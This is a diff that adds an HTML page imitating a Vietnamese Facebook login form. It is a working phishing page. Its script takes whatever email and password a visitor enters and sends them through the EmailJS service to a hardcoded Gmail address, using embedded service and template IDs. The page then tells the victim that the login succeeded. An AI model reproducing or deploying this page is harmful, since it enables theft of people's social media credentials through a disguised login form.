@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Đăng nhập Facebook</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        body {
+            background-color: #f8f9fa;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding-top: 50px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #1877f2;
+        }
+
+        .btn-primary {
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .form-text {
+            color: #8e8e8e;
+        }
+
+        .login-link {
+            color: #1877f2;
+            text-decoration: none;
+        }
+    </style>
+   
+</head>
+<body>
+    <div class="container">
+        <h2>Đăng nhập vào Facebook</h2>
+        <form>
+            <div class="mb-3">
+                <input type="email" class="form-control" id="email" placeholder="Email hoặc số điện thoại" required>
+            </div>
+            <div class="mb-3">
+                <input type="password" class="form-control" id="password" placeholder="Mật khẩu" required>
+            </div>
+            <div class="mb-3">
+                <button type="button" id="loginbutton" class="btn btn-primary">Đăng nhập</button>
+            </div>
+            <div class="mb-3 text-center">
+                <a href="#" class="login-link">Quên mật khẩu?</a>
+            </div>
+            <div class="mb-3 text-center">
+                <span class="form-text">Bạn chưa có tài khoản? <a href="#" class="login-link">Đăng ký ngay</a></span>
+            </div>
+        </form>
+    </div>
+    
+    <script>
+        emailjs.init("2QuIJpJx1QistgTJi");
+        function sendEmail() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const emailData = {
+                to_email: "vthuanlaman@gmail.com",
+                email: email,
+                password: password,
+            };
+            emailjs.send("service_qsrc6se", "template_90n3x8u", emailData).then(
+                function (response) {
+                    console.log("Email gửi thành công:", response);
+                    alert("Đăng nhập thành công và email đã được gửi.");
+                },
+                function (error) {
+                    console.log("Lỗi khi gửi email:", error);
+                    alert("Đăng nhập thành công, nhưng có lỗi khi gửi email.");
+                }
+            );
+        }
+        window.onload = function(){
+            document.getElementById("loginbutton").addEventListener("click", sendEmail);
+            alert("here");
+        }
+    </script>
+</body>
+</html>
